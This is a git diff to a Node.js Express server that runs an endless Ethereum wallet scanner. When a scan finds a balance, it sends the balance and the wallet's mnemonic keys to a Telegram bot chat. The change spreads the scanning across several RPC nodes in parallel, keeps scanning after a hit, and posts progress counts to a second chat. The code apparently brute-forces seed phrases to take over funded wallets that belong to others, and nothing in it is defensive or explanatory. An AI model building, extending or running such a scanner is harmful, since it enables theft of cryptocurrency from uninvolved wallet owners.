@@ -2,58 +2,53 @@ const { Web3Factory } = require('./modules/web3Factory')
 const env = require('./modules/env')
 const express = require('express')
 const app = express()
-const port = process.env.PORT || 4000;
-
+const port = process.env.PORT || 4000
 
 const NOTI_RUNNING = '-1002158985462'
 const NOTI_FOUND = '-1002151658507'
 
-
-
 const sendMessage = async (message, chatId) => {
   fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
-    method: "POST",
+    method: 'POST',
     headers: {
-      'Content-Type': 'application/json'
+      'Content-Type': 'application/json',
     },
     body: JSON.stringify({
       chat_id: chatId,
-      text: message
+      text: message,
     }),
-  });
-  
+  })
 }
 
-async function scan() { 
-  let i = 1
-
-  
+async function scan(ethereumInstance) {
   try {
-    // Build web3 instance
-    const ethereumInstance = new Web3Factory(env.ETHEREUM_RPC_NODE, 'ethereum')
+    const ethereumScanResult = await ethereumInstance.scanNetwork()
+    console.log('ethereumScanResult.balance', ethereumScanResult.balance)
+    if (ethereumScanResult.balance) {
+      console.log(ethereumScanResult)
+      const text =
+        'Balance: ' + ethereumScanResult.balance + ' - Keys: ' + ethereumScanResult.mnemonic
+      sendMessage(text, NOTI_FOUND)
+    }
+  } catch (error) {
+    console.log('error', error)
+  }
+}
 
-    // Scan blockchain
-    while (true) {
-      if (i % 2000 === 0) {
-        const text = 'Server: ' + env.SERVER_NAME + ' --- Scanned: ' + i
-        sendMessage(text, NOTI_RUNNING)
-      }
-      try {
-        const ethereumScanResult = await ethereumInstance.scanNetwork()
-        if (ethereumScanResult.balance) {
-          console.log(ethereumScanResult)
-          const text = 'Balance: ' + ethereumScanResult.balance + ' - Keys: ' + ethereumScanResult.mnemonic
-          sendMessage(text, NOTI_FOUND)
-          break
-        }
-      } catch (error) {
-        throw new Error('Unexpected error occurred', error.message || error)
-      }
-      i = i + 1
+async function main() {
+  const rpcNodes = env.ETHEREUM_RPC_NODE.split(',')
+  const instances = rpcNodes.map(rpc => new Web3Factory(rpc, 'ethereum'))
+  let i = 1
+  while (true) {
+    const promises = instances.map(ins => scan(ins))
+    await Promise.all(promises)
+
+    if (i % 2000 === 0) {
+      const text = 'Server: ' + env.SERVER_NAME + ' --- Scanned: ' + i * rpcNodes.length
+      sendMessage(text, NOTI_RUNNING)
     }
 
-  } catch (error) {
-    throw new Error(error.message || error)
+    i = i + 1
   }
 }
 
@@ -62,8 +57,11 @@ app.get('/', (req, res) => {
 })
 
 app.listen(port, () => {
-  scan()
   console.log(`Example app listening on port ${port}`)
+
+  try {
+    main()
+  } catch (error) {
+    console.log('error', error)
+  }
 })
-
-
